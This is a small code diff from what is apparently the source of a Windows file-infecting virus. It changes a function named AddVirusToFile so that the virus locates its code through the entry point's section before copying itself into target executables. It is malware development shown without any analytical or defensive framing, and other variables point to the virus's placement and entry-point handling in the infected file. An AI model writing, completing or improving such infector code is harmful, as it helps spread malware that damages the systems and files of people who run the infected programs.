@@ -7,7 +7,7 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, L
     PVOID section_data = NULL;
     DWORD section_size = 0;
     DWORD virus_section_va = 0;
-    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
+    PIMAGE_SECTION_HEADER virus_section = GetCodeSectionOfEntryPoint(data->this_file_base_address);
     DWORD virus_va_in_target;
     DWORD virus_ra_in_target;
     DWORD target_entry_point;
